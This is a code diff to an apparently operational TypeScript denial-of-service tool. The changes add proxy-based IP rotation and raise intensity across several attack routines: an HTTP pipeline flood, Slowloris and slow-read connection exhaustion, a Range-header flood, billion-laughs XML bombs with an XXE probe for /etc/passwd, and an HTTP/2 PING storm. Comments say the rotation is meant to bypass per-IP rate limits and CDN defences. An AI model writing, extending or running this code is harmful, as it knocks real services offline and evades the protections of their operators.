@@ -1332,16 +1332,17 @@ async function runHTTPPipeline(
   hostname: string,
   targetPort: number,
   threads: number,
+  proxies: ProxyConfig[],
   signal: AbortSignal,
   onStats: (pkts: number, bytes: number) => void,
 ): Promise<void> {
-  let localPkts = 0, localBytes = 0;
+  let localPkts = 0, localBytes = 0, pIdx = 0;
   const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
-  // Deployed (8 vCPU/32GB): 512-slot pool × 256-req batches = massive throughput
-  const POOL_SIZE = IS_DEPLOYED ? 512 : 256;
-  const PIPELINE  = IS_DEPLOYED ? 256 : 128; // requests per write batch
+  // Deployed (8 vCPU/32GB): 1024-slot pool × 512-req batches (was 512/256)
+  const POOL_SIZE = IS_DEPLOYED ? 1024 : 512;
+  const PIPELINE  = IS_DEPLOYED ? 512 : 256; // requests per write batch
 
   // Pre-build a pool of raw HTTP request buffers
   const reqPool: Buffer[] = Array.from({ length: POOL_SIZE }, () => buildRawReq(hostname));
@@ -1373,60 +1374,50 @@ async function runHTTPPipeline(
     reqPool[idx] = buildRawReq(hostname);
   }, 40);
 
-  const useHttps = targetPort === 443;
-
-  const oneConn = (): Promise<void> => new Promise(resolve => {
-    if (signal.aborted) { resolve(); return; }
-
-    let sock: net.Socket;
-    if (useHttps) {
-      sock = tls.connect({
-        host: resolvedHost, port: targetPort,
-        servername: hostname, rejectUnauthorized: false,
-      });
-    } else {
-      sock = net.createConnection({ host: resolvedHost, port: targetPort });
-    }
+  const oneConn = async (): Promise<void> => {
+    if (signal.aborted) return;
+    let sock: tls.TLSSocket | net.Socket;
+    try {
+      // mkTLSSock routes through SOCKS5/HTTP proxy for IP rotation
+      sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["http/1.1"]);
+    } catch { return; }
     sock.setNoDelay(true);
     sock.setTimeout(12_000);
 
-    const pump = () => {
-      if (signal.aborted) { sock.destroy(); resolve(); return; }
-      let ok = true;
-      for (let i = 0; i < PIPELINE; i++) {
-        const buf = reqPool[randInt(0, POOL_SIZE)];
-        localPkts++;
-        localBytes += buf.length;
-        ok = sock.write(buf);
-        if (!ok) break; // backpressure — wait for drain
-      }
-      if (ok) setImmediate(pump); // setImmediate instead of setTimeout for max throughput
-      else sock.once("drain", pump);
-    };
-
-    const startPump = () => pump();
-    if (useHttps) {
-      (sock as tls.TLSSocket).once("secureConnect", startPump);
-    } else {
-      sock.once("connect", startPump);
-    }
-    sock.on("data",    () => {}); // drain responses — keeps TCP window open
-    sock.on("timeout", () => { sock.destroy(); resolve(); });
-    sock.on("error",   () => { resolve(); });
-    sock.on("close",   () => { resolve(); }); // outer while-loop handles reconnect
-    signal.addEventListener("abort", () => { sock.destroy(); resolve(); }, { once: true });
-  });
+    await new Promise<void>((resolve) => {
+      const pump = () => {
+        if (signal.aborted) { sock.destroy(); resolve(); return; }
+        let ok = true;
+        for (let i = 0; i < PIPELINE; i++) {
+          const buf = reqPool[randInt(0, POOL_SIZE)];
+          localPkts++;
+          localBytes += buf.length;
+          ok = sock.write(buf);
+          if (!ok) break; // backpressure — wait for drain
+        }
+        if (ok) setImmediate(pump); // setImmediate instead of setTimeout for max throughput
+        else sock.once("drain", pump);
+      };
+      // mkTLSSock already connected — start pumping immediately
+      setImmediate(pump);
+      sock.on("data",    () => {}); // drain responses — keeps TCP window open
+      sock.on("timeout", () => { sock.destroy(); resolve(); });
+      sock.on("error",   () => { resolve(); });
+      sock.on("close",   () => { resolve(); });
+      signal.addEventListener("abort", () => { sock.destroy(); resolve(); }, { once: true });
+    });
+  };
 
   // ★ Async reconnect loop — exactly one connection per slot, no accumulation
   const runConn = async (): Promise<void> => {
     while (!signal.aborted) {
       await oneConn();
-      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 1)); // was 10ms
+      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 1));
     }
   };
 
-  // Deployed (32GB): 4K pipeline conns × ~100KB = 400MB — comfortable headroom
-  const MAX_PIPE_CONNS = IS_DEPLOYED ? Math.min(threads, 4000) : Math.min(threads, 2000);
+  // Deployed (32GB): 5K pipeline conns (was 4K) for higher saturation
+  const MAX_PIPE_CONNS = IS_DEPLOYED ? Math.min(threads, 5000) : Math.min(threads, 2000);
   await Promise.all(Array.from({ length: MAX_PIPE_CONNS }, runConn));
   clearInterval(flushIv);
   clearInterval(poolIv);
@@ -1569,6 +1560,7 @@ async function runSlowlorisReal(
   hostname: string,
   targetPort: number,
   threads: number,
+  proxies: ProxyConfig[],
   signal: AbortSignal,
   onStats: (p: number, b: number, c?: number) => void,
   useHttps = false,
@@ -1578,50 +1570,61 @@ async function runSlowlorisReal(
   const MAX_CONN = !IS_PROD
     ? Math.min(threads * 8, 800)                                               // dev: max 800
     : IS_DEPLOYED ? Math.min(threads * 75, 30000) : Math.min(threads * 50, 15000);
-  let localPkts = 0, localBytes = 0, activeConns = 0;
+  let localPkts = 0, localBytes = 0, activeConns = 0, pIdx = 0;
   const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 250);
 
-  const oneSlowConn = (): Promise<void> => new Promise(resolve => {
+  const oneSlowConn = (): Promise<void> => new Promise(async (resolve) => {
     if (signal.aborted) { resolve(); return; }
+    let sock: net.Socket;
 
-    // Use TLS for HTTPS targets — plain TCP is rejected by nginx on port 443
-    const sock: net.Socket = useHttps
-      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
-      : net.createConnection({ host: resolvedHost, port: targetPort });
+    if (proxies.length > 0) {
+      // mkTLSSock resolves only after TLS handshake is done — safe to use immediately
+      try {
+        sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["http/1.1"]);
+      } catch { resolve(); return; }
+      sock.setNoDelay(true);
+      sock.setTimeout(180_000);
+      // mkTLSSock already connected — start the attack directly
+      doSlowloris();
+    } else {
+      // Direct connection — wait for connect event before starting
+      sock = useHttps
+        ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
+        : net.createConnection({ host: resolvedHost, port: targetPort });
+      sock.setNoDelay(true);
+      sock.setTimeout(180_000);
+      const onConnect = () => doSlowloris();
+      if (useHttps) (sock as tls.TLSSocket).once("secureConnect", onConnect);
+      else          sock.once("connect", onConnect);
+    }
+    sock.once("error",   done);
+    sock.once("close",   done);
+    sock.once("timeout", done);
+    signal.addEventListener("abort", done, { once: true });
 
-    sock.setNoDelay(true);
-    sock.setTimeout(180_000); // 3-minute timeout — keep alive
-
-    let keepIv:  NodeJS.Timeout | null = null;
-    let settled  = false;
-
-    const cleanup = () => {
-      if (settled) return;
+    let keepIv: NodeJS.Timeout | null = null;
+    function done() {
       activeConns = Math.max(0, activeConns - 1);
       if (keepIv) { clearInterval(keepIv); keepIv = null; }
       try { sock.destroy(); } catch { /**/ }
-      if (signal.aborted) { settled = true; resolve(); return; }
-      // Just resolve — the outer async runSock loop handles reconnection
-      settled = true;
       resolve();
-    };
+    }
+    const cleanup = done;
 
-    const onConnected = () => {
+    function doSlowloris() {
       activeConns++;
       localPkts++;
 
-      // ★ DUAL-MODE SLOWLORIS:
-      // 60% classic GET Slowloris (missing final \r\n\r\n — server waits for request completion)
-      // 40% POST Slowloris (sends huge Content-Length, server waits for body to arrive byte by byte)
-      //
-      // POST variant exploits: server allocates a body buffer of Content-Length size, then waits.
-      // Apache + nginx buffer the body before handing to app — 1GB Content-Length = 1GB reserved.
-      // Even body-streaming servers keep the connection slot open until Content-Length bytes received.
-      const usePost = Math.random() < 0.4;
+      // ★ TRIPLE-MODE SLOWLORIS (upgraded from dual):
+      // 50% classic GET Slowloris (missing final \r\n\r\n)
+      // 35% POST Slowloris (1GB Content-Length, trickle body)
+      // 15% HEAD Slowloris (partial headers — many servers parse HEAD headers fully before responding)
+      const variant = Math.random();
+      const usePost = variant < 0.35;
+      const useHead = variant >= 0.85;
 
       if (usePost) {
-        // POST Slowloris: complete HTTP headers, 1GB Content-Length, trickle body bytes slowly
         const postHeaders = [
           `POST ${hotPath()}?_=${randStr(8)}&v=${randInt(1, 9999999)} HTTP/1.1`,
           `Host: ${hostname}`,
@@ -1632,27 +1635,37 @@ async function runSlowlorisReal(
           `X-Forwarded-For: ${randIp()}`,
           `Connection: keep-alive`,
           `Content-Type: application/x-www-form-urlencoded`,
-          `Content-Length: 1073741824`, // 1GB — server waits for this many bytes
-          `\r\n`, // complete headers — server now waits for 1GB of body
+          `Content-Length: 1073741824`, // 1GB — server waits for body
+          `\r\n`,
         ].join("\r\n");
-
         sock.write(postHeaders);
         localBytes += postHeaders.length;
-
-        // Trickle body bytes every 10-25s — never completes, holds connection open
         keepIv = setInterval(() => {
           if (signal.aborted || sock.destroyed) { cleanup(); return; }
-          // Send 1-4 bytes of random body data — looks like real slow upload
-          const bodyChunk = `${randStr(randInt(1, 4))}`;
-          sock.write(bodyChunk, (err) => {
-            if (err) { cleanup(); return; }
-            localPkts++;
-            localBytes += bodyChunk.length;
-          });
-        }, randInt(8_000, 20_000)); // slightly faster trickle to stay alive longer
+          const chunk = randStr(randInt(1, 4));
+          sock.write(chunk, (err) => { if (err) cleanup(); else { localPkts++; localBytes += chunk.length; } });
+        }, randInt(8_000, 18_000));
+
+      } else if (useHead) {
+        // HEAD variant — partial HEAD request, server waits for final \r\n\r\n
+        const partial = [
+          `HEAD ${hotPath()}?_=${randStr(8)} HTTP/1.1`,
+          `Host: ${hostname}`,
+          `User-Agent: ${randUA()}`,
+          `Accept: */*`,
+          `Connection: keep-alive`,
+          ``, // missing final \r\n
+        ].join("\r\n");
+        sock.write(partial);
+        localBytes += partial.length;
+        keepIv = setInterval(() => {
+          if (signal.aborted || sock.destroyed) { cleanup(); return; }
+          const hdr = `X-${randStr(6)}: ${randStr(randInt(6, 18))}\r\n`;
+          sock.write(hdr, (err) => { if (err) cleanup(); else { localPkts++; localBytes += hdr.length; } });
+        }, randInt(8_000, 20_000));
 
       } else {
-        // Classic GET Slowloris — intentionally missing the final \r\n\r\n
+        // Classic GET Slowloris
         const partial = [
           `GET ${hotPath()}?_=${randStr(8)}&v=${randInt(1, 9999999)} HTTP/1.1`,
           `Host: ${hostname}`,
@@ -1663,41 +1676,18 @@ async function runSlowlorisReal(
           `X-Forwarded-For: ${randIp()}`,
           `Connection: keep-alive`,
           `Referer: https://google.com/`,
-          ``, // NO final \r\n\r\n — this is the Slowloris trick
+          ``, // NO final \r\n\r\n
         ].join("\r\n");
-
         sock.write(partial);
         localBytes += partial.length;
-
-        // Trickle a junk header every 10-25s to prevent server timeout
         keepIv = setInterval(() => {
           if (signal.aborted || sock.destroyed) { cleanup(); return; }
           const hdr = `X-${randStr(5)}-${randStr(3)}: ${randStr(randInt(8, 20))}\r\n`;
-          sock.write(hdr, (err) => {
-            if (err) { cleanup(); return; }
-            localPkts++;
-            localBytes += hdr.length;
-          });
-        }, randInt(10_000, 25_000));
+          sock.write(hdr, (err) => { if (err) cleanup(); else { localPkts++; localBytes += hdr.length; } });
+        }, randInt(8_000, 22_000));
       }
-    };
 
-    // TLS emits 'secureConnect', plain TCP emits 'connect'
-    if (useHttps) {
-      (sock as tls.TLSSocket).once("secureConnect", onConnected);
-    } else {
-      sock.once("connect", onConnected);
     }
-
-    sock.once("error",   cleanup);
-    sock.once("timeout", cleanup);
-    sock.once("close",   cleanup);
-
-    signal.addEventListener("abort", () => {
-      if (keepIv) { clearInterval(keepIv); keepIv = null; }
-      try { sock.destroy(); } catch { /**/ }
-      if (!settled) { settled = true; resolve(); }
-    }, { once: true });
   });
 
   const runSock = async (): Promise<void> => {
@@ -4217,75 +4207,76 @@ async function runHPACKBomb(
 // ─────────────────────────────────────────────────────────────────────────
 async function runSlowRead(
   resolvedHost: string, hostname: string, targetPort: number, threads: number,
+  proxies: ProxyConfig[],
   signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
 ): Promise<void> {
-  const isHttps = targetPort === 443;
-  let localPkts = 0, localBytes = 0, conns = 0;
+  let localPkts = 0, localBytes = 0, conns = 0, pIdx = 0;
   const flush   = () => { onStats(localPkts, localBytes, conns); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
-  const oneConn = (): Promise<void> => new Promise<void>((resolve) => {
-    if (signal.aborted) { resolve(); return; }
-    const sock: net.Socket = isHttps
-      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
-      : net.createConnection({ host: resolvedHost, port: targetPort });
-    sock.setNoDelay(true);
-    let settled = false;
+  const oneConn = async (): Promise<void> => {
+    if (signal.aborted) return;
     let readIv: NodeJS.Timeout | null = null;
     let holdTimer: NodeJS.Timeout | null = null;
-    const done = () => {
-      if (settled) return; settled = true;
-      conns = Math.max(0, conns - 1);
-      if (readIv)   { clearInterval(readIv);   readIv   = null; }
-      if (holdTimer){ clearTimeout(holdTimer);  holdTimer = null; }
-      try { sock.destroy(); } catch { /**/ }
-      resolve();
-    };
-    const onConn = () => {
+    try {
+      // mkTLSSock — routes through proxy so each slow connection comes from a different IP
+      const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["http/1.1"]);
+      sock.setNoDelay(true);
       conns++;
       localPkts++;
-      // Complete request — so server starts sending response and fills its buffer
-      const req = [
-        `GET ${hotPath()}?_=${randStr(8)} HTTP/1.1`,
-        `Host: ${hostname}`,
-        `User-Agent: ${randUA()}`,
-        `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/avif,*/*;q=0.8`,
-        `Accept-Encoding: gzip, deflate, br, zstd`,
-        `Accept-Language: en-US,en;q=0.9`,
-        `Connection: keep-alive`,
-        `\r\n`,
-      ].join("\r\n");
-      sock.write(req);
-      localBytes += req.length;
-      // Pause reading immediately — server's send buffer fills and it blocks
-      sock.pause();
-      // Drip-read 1 byte every 600ms to prevent server FIN while still blocking
-      readIv = setInterval(() => {
-        if (signal.aborted || sock.destroyed) { done(); return; }
-        try {
-          const chunk = sock.read(1);
-          if (chunk) { localBytes += 1; }
-        } catch { done(); }
-      }, 600);
-      // Hold the connection for up to 90s before cycling
-      holdTimer = setTimeout(done, 90_000);
-    };
-    if (isHttps) (sock as tls.TLSSocket).once("secureConnect", onConn);
-    else          sock.once("connect", onConn);
-    sock.on("error",   done);
-    sock.on("close",   done);
-    sock.setTimeout(120_000);
-    sock.on("timeout", done);
-    signal.addEventListener("abort", done, { once: true });
-  });
+
+      await new Promise<void>((resolve) => {
+        const done = () => {
+          conns = Math.max(0, conns - 1);
+          if (readIv)    { clearInterval(readIv);   readIv    = null; }
+          if (holdTimer) { clearTimeout(holdTimer);  holdTimer = null; }
+          try { sock.destroy(); } catch { /**/ }
+          resolve();
+        };
+        // Complete request — server starts sending response and fills its send buffer
+        const req = [
+          `GET ${hotPath()}?_=${randStr(8)}&v=${randInt(1,999999)} HTTP/1.1`,
+          `Host: ${hostname}`,
+          `User-Agent: ${randUA()}`,
+          `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/avif,*/*;q=0.8`,
+          `Accept-Encoding: gzip, deflate, br, zstd`,
+          `Accept-Language: en-US,en;q=0.9`,
+          `Connection: keep-alive`,
+          `\r\n`,
+        ].join("\r\n");
+        sock.write(req);
+        localBytes += req.length;
+        // Pause reading immediately — server's send buffer fills up and thread blocks
+        sock.pause();
+        // Drip-read 1 byte every 500ms (was 600ms) to prevent server FIN while still blocking
+        readIv = setInterval(() => {
+          if (signal.aborted || sock.destroyed) { done(); return; }
+          try {
+            const chunk = sock.read(1);
+            if (chunk) { localBytes += 1; }
+          } catch { done(); }
+        }, 500);
+        // Hold for up to 90s — forces server thread to remain allocated the whole time
+        holdTimer = setTimeout(done, 90_000);
+        sock.on("error",   done);
+        sock.on("close",   done);
+        sock.setTimeout(120_000);
+        sock.on("timeout", done);
+        signal.addEventListener("abort", done, { once: true });
+      });
+    } catch { /* proxy/socket failed — reconnect immediately */ }
+  };
 
   const runSlot = async () => {
     while (!signal.aborted) {
       await oneConn();
-      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 30));
+      // No sleep — slots cycle immediately after connection closes
     }
   };
-  await Promise.all(Array.from({ length: Math.max(20, threads) }, runSlot));
+  const numSlots = IS_DEPLOYED
+    ? Math.min(Math.max(40, threads * 2), 2000)
+    : Math.max(20, threads);
+  await Promise.all(Array.from({ length: numSlots }, runSlot));
   clearInterval(flushIv); flush();
 }
 
@@ -4299,15 +4290,18 @@ async function runSlowRead(
 //  Effective against: nginx, Apache, CDN edge servers with byte-serving.
 // ─────────────────────────────────────────────────────────────────────────
 async function runRangeFlood(
-  base: string, threads: number, signal: AbortSignal,
+  base: string, threads: number, proxies: ProxyConfig[], signal: AbortSignal,
   onStats: (p: number, b: number) => void,
 ): Promise<void> {
   // Multiple range variants — different sizes stress different server codepaths
   const RANGES = [
-    Array.from({ length: 500 }, (_, i) => `${i}-${i}`).join(","),   // 500 × 1-byte
-    Array.from({ length: 200 }, (_, i) => `${i*3}-${i*3+2}`).join(","), // 200 × 3-byte
-    Array.from({ length: 100 }, (_, i) => `${i*5}-${i*5+4}`).join(","), // 100 × 5-byte
+    Array.from({ length: 500 }, (_, i) => `${i}-${i}`).join(","),            // 500 × 1-byte  (heaviest)
+    Array.from({ length: 300 }, (_, i) => `${i*3}-${i*3+2}`).join(","),      // 300 × 3-byte
+    Array.from({ length: 200 }, (_, i) => `${i*5}-${i*5+4}`).join(","),      // 200 × 5-byte
+    Array.from({ length: 128 }, (_, i) => `${i*8}-${i*8+7}`).join(","),      // 128 × 8-byte
     "0-0,1000-1001,2000-2001,3000-3001,4000-4001,5000-5001,6000-6001,7000-7001,8000-8001,9000-9001",
+    // Overlapping ranges — forces server to deduplicate
+    Array.from({ length: 100 }, (_, i) => `${i*2}-${i*2+10}`).join(","),
   ];
 
   let localPkts = 0, localBytes = 0;
@@ -4317,14 +4311,22 @@ async function runRangeFlood(
   const doReq = async () => {
     if (signal.aborted) return;
     try {
-      const range = RANGES[randInt(0, RANGES.length)];
-      const hdrs  = buildHeaders(false);
-      hdrs["Range"]    = `bytes=${range}`;
-      hdrs["If-Range"] = new Date(Date.now() - randInt(3600_000, 86400_000)).toUTCString();
-      const res = await fetch(buildUrl(base), {
-        headers: hdrs,
-        signal:  AbortSignal.timeout(5000),
-      });
+      const range  = RANGES[randInt(0, RANGES.length)];
+      const hdrs   = buildHeaders(false) as Record<string, string>;
+      hdrs["Range"]         = `bytes=${range}`;
+      hdrs["If-Range"]      = new Date(Date.now() - randInt(3600_000, 86400_000)).toUTCString();
+      hdrs["Cache-Control"] = "no-cache";
+      const url = buildUrl(base);
+      // 95% via proxy for IP rotation — range requests bypass CDN when IP changes
+      if (proxies.length > 0 && Math.random() < 0.95) {
+        const proxy = pickProxy(proxies);
+        const bytes = await fetchViaProxy(url, proxy, "GET", hdrs)
+          .then(b => { recordProxySuccess(proxy.host, proxy.port); return b; })
+          .catch(() => { recordProxyFailure(proxy.host, proxy.port); return 150; });
+        localPkts++; localBytes += bytes;
+        return;
+      }
+      const res = await fetch(url, { headers: hdrs, signal: AbortSignal.timeout(5000) });
       localPkts++;
       localBytes += parseInt(res.headers.get("content-length") || "0") || 1024;
       await res.body?.cancel();
@@ -4333,8 +4335,11 @@ async function runRangeFlood(
     }
   };
 
+  const numSlots = IS_DEPLOYED
+    ? Math.min(Math.max(200, threads * 4), 5000)
+    : Math.max(60, threads);
   const runSlot = async () => { while (!signal.aborted) { await doReq(); } };
-  await Promise.all(Array.from({ length: Math.max(60, threads) }, runSlot));
+  await Promise.all(Array.from({ length: numSlots }, runSlot));
   clearInterval(flushIv); flush();
 }
 
@@ -4347,20 +4352,25 @@ async function runRangeFlood(
 //  Hits: xmlrpc.php, SOAP endpoints, XML REST APIs, OData.
 // ─────────────────────────────────────────────────────────────────────────
 async function runXMLBomb(
-  base: string, threads: number, signal: AbortSignal,
+  base: string, threads: number, proxies: ProxyConfig[], signal: AbortSignal,
   onStats: (p: number, b: number) => void,
 ): Promise<void> {
-  // Billion-laughs lite — 4 levels of entity expansion
-  const XML_BOMB = `<?xml version="1.0"?>\n<!DOCTYPE lolz [\n  <!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">\n  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">\n  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">\n  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">\n]>\n<root><data>&d;&d;&d;&d;</data></root>`;
+  // Billion-laughs — 5 levels of entity expansion (was 4)
+  const XML_BOMB = `<?xml version="1.0"?>\n<!DOCTYPE lolz [\n  <!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">\n  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">\n  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">\n  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">\n  <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;">\n]>\n<root><data>&e;&e;&e;&e;</data></root>`;
 
   // SOAP variant with XXE probe
-  const SOAP_BOMB = `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">\n<soapenv:Header/>\n<soapenv:Body><data>&xxe;</data></soapenv:Body>\n</soapenv:Envelope>`;
+  const SOAP_BOMB = `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"><!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">]>\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">\n<soapenv:Header/>\n<soapenv:Body><data>&xxe;&b;&b;&b;&b;</data></soapenv:Body>\n</soapenv:Envelope>`;
+
+  // JSON Content-Type bypass — some parsers auto-detect XML inside JSON body
+  const buildJSONXMLBomb = (hName: string) =>
+    JSON.stringify({ xml: XML_BOMB, action: "parse", host: hName, _t: Date.now() });
 
   const XML_ENDPOINTS = [
     "/xmlrpc.php", "/api/xml", "/soap", "/webservice", "/api/soap",
     "/services/soap", "/ws", "/api/ws", "/xmlrpc", "/rpc", "/api",
     "/api/v1", "/api/v2", "/WS", "/Service.asmx", "/WebService.asmx",
     "/?wsdl", "/axis2/services", "/OData/", "/odata/",
+    "/api/v3", "/graphql", "/api/graphql", "/api/upload", "/api/import",
   ];
 
   const hName = (() => { try { return new URL(base).hostname; } catch { return base; } })();
@@ -4370,20 +4380,30 @@ async function runXMLBomb(
 
   const doReq = async () => {
     if (signal.aborted) return;
-    const payload  = Math.random() < 0.7 ? XML_BOMB : SOAP_BOMB;
+    const variant  = Math.random();
+    const payload  = variant < 0.6 ? XML_BOMB : variant < 0.85 ? SOAP_BOMB : buildJSONXMLBomb(hName);
     const isSoap   = payload === SOAP_BOMB;
+    const isJson   = payload.startsWith("{");
     const endpoint = XML_ENDPOINTS[randInt(0, XML_ENDPOINTS.length)];
+    const url      = new URL(endpoint, base).toString();
+    const hdrs: Record<string, string> = {
+      ...(buildHeaders(true, payload.length) as Record<string, string>),
+      "Content-Type":   isJson ? "application/json" : (isSoap ? "text/xml; charset=utf-8" : "application/xml"),
+      "SOAPAction":     `"http://${hName}/service"`,
+      "Content-Length": String(payload.length),
+    };
     try {
-      const res = await fetch(new URL(endpoint, base).toString(), {
-        method:  "POST",
-        headers: {
-          ...buildHeaders(true, payload.length),
-          "Content-Type":  isSoap ? "text/xml; charset=utf-8" : "application/xml",
-          "SOAPAction":    `"http://${hName}/service"`,
-          "Content-Length": String(payload.length),
-        },
-        body:   payload,
-        signal: AbortSignal.timeout(4000),
+      // 95% via proxy — IP rotation bypasses per-IP XML endpoint rate limits
+      if (proxies.length > 0 && Math.random() < 0.95) {
+        const proxy = pickProxy(proxies);
+        const bytes = await fetchViaProxy(url, proxy, "POST", hdrs, payload)
+          .then(b => { recordProxySuccess(proxy.host, proxy.port); return b; })
+          .catch(() => { recordProxyFailure(proxy.host, proxy.port); return payload.length; });
+        localPkts++; localBytes += bytes;
+        return;
+      }
+      const res = await fetch(url, {
+        method: "POST", headers: hdrs, body: payload, signal: AbortSignal.timeout(4000),
       });
       localPkts++;
       localBytes += payload.length;
@@ -4393,8 +4413,11 @@ async function runXMLBomb(
     }
   };
 
+  const numSlots = IS_DEPLOYED
+    ? Math.min(Math.max(150, threads * 3), 3000)
+    : Math.max(40, threads);
   const runSlot = async () => { while (!signal.aborted) { await doReq(); } };
-  await Promise.all(Array.from({ length: Math.max(40, threads) }, runSlot));
+  await Promise.all(Array.from({ length: numSlots }, runSlot));
   clearInterval(flushIv); flush();
 }
 
@@ -4410,6 +4433,7 @@ async function runXMLBomb(
 // ─────────────────────────────────────────────────────────────────────────
 async function runH2PingStorm(
   resolvedHost: string, hostname: string, targetPort: number, threads: number,
+  proxies: ProxyConfig[],
   signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
 ): Promise<void> {
   // H2 PING frame: 9-byte header + 8-byte opaque data = 17 bytes
@@ -4438,56 +4462,58 @@ async function runH2PingStorm(
   const flush   = () => { onStats(localPkts, localBytes, localConns); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
-  const onePingConn = (): Promise<void> => new Promise<void>((resolve) => {
-    if (signal.aborted) { resolve(); return; }
-    const sock: tls.TLSSocket | net.Socket = targetPort === 443
-      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false, ALPNProtocols: ["h2"] })
-      : net.createConnection({ host: resolvedHost, port: targetPort });
-    let settled = false;
+  let pIdx = 0;
+  const onePingConn = async (): Promise<void> => {
+    if (signal.aborted) return;
     let pingIv: NodeJS.Timeout | null = null;
-    const done = () => {
-      if (settled) return; settled = true;
-      if (pingIv) { clearInterval(pingIv); pingIv = null; }
-      localConns = Math.max(0, localConns - 1);
-      try { sock.destroy(); } catch { /**/ }
-      resolve();
-    };
-    const startPinging = () => {
+    let sock: tls.TLSSocket | null = null;
+    try {
+      // mkTLSSock routes through SOCKS5/HTTP proxy — each conn from a different IP
+      sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["h2"]);
       localConns++;
-      // Send preface + initial SETTINGS
-      sock.write(Buffer.concat([H2_CLIENT_PREFACE, H2_SETTINGS, H2_SETTINGS_ACK]));
-      localPkts++;
-      localBytes += H2_CLIENT_PREFACE.length + H2_SETTINGS.length + H2_SETTINGS_ACK.length;
-      // Blast PING frames as fast as possible
-      pingIv = setInterval(() => {
-        if (signal.aborted || sock.destroyed) { done(); return; }
-        // Send 50 PINGs per interval burst
-        for (let i = 0; i < 50; i++) {
-          const ping = PING_POOL[randInt(0, PING_POOL.length)];
-          sock.write(ping);
-          localPkts++;
-          localBytes += 17;
-        }
-      }, 5); // 50 PINGs × 200/s = 10,000 PINGs/s per connection
-      // Cycle connection every 30s
-      setTimeout(done, 30_000);
-    };
-    if (sock instanceof tls.TLSSocket) sock.once("secureConnect", startPinging);
-    else                                sock.once("connect", startPinging);
-    sock.on("error", done);
-    sock.on("close", done);
-    sock.setTimeout(35_000);
-    sock.on("timeout", done);
-    signal.addEventListener("abort", done, { once: true });
-  });
+
+      await new Promise<void>((resolve) => {
+        const done = () => {
+          if (pingIv) { clearInterval(pingIv); pingIv = null; }
+          localConns = Math.max(0, localConns - 1);
+          try { sock?.destroy(); } catch { /**/ }
+          resolve();
+        };
+        // Send preface + initial SETTINGS immediately
+        sock!.write(Buffer.concat([H2_CLIENT_PREFACE, H2_SETTINGS, H2_SETTINGS_ACK]));
+        localPkts++;
+        localBytes += H2_CLIENT_PREFACE.length + H2_SETTINGS.length + H2_SETTINGS_ACK.length;
+
+        // Blast 100 PING frames every 3ms (was 50 every 5ms) = ~33K PINGs/s per conn
+        pingIv = setInterval(() => {
+          if (signal.aborted || sock!.destroyed) { done(); return; }
+          const frames = Buffer.concat(Array.from({ length: 100 }, () => PING_POOL[randInt(0, PING_POOL.length)]));
+          sock!.write(frames);
+          localPkts += 100;
+          localBytes += 17 * 100;
+        }, 3);
+        // Cycle connection every 25s
+        setTimeout(done, 25_000);
+        sock!.on("data",    () => {});
+        sock!.on("error",   done);
+        sock!.on("close",   done);
+        sock!.setTimeout(30_000);
+        sock!.on("timeout", done);
+        signal.addEventListener("abort", done, { once: true });
+      });
+    } catch { /* proxy/socket failed — reconnect immediately */ }
+  };
 
   const runSlot = async () => {
     while (!signal.aborted) {
       await onePingConn();
-      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 20));
+      // No artificial delay — immediate reconnect
     }
   };
-  await Promise.all(Array.from({ length: Math.max(30, threads) }, runSlot));
+  const numSlots = IS_DEPLOYED
+    ? Math.min(Math.max(50, threads * 2), 2000)
+    : Math.max(30, threads);
